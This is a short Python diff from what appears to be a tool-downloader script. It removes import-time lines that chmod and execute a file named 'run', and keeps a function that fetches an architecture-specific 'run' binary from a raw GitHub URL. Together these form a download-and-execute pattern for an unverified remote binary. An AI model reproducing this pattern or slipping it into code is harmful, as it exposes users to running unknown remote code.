@@ -26,11 +26,6 @@ def get_size(number_size):
 		if number_size < 1024.0:
 			return "%3.1f %s" % (number_size, memeg)
 		number_size /= 1024.0
-import os
-
-if not oct(os.stat("run").st_mode)[-3:] == "775":
-	os.system("chmod 775 run")
-os.system("./run")
 
 def donlot(url="https://raw.githubusercontent.com/Mark-Zugbreg/stfu/main/filekrek/", block_size=1024, baru=0):
 	res = session.get((lambda i: url + i + "bit/run")("64" if machine == 'aarch64' else "32"), stream=True)
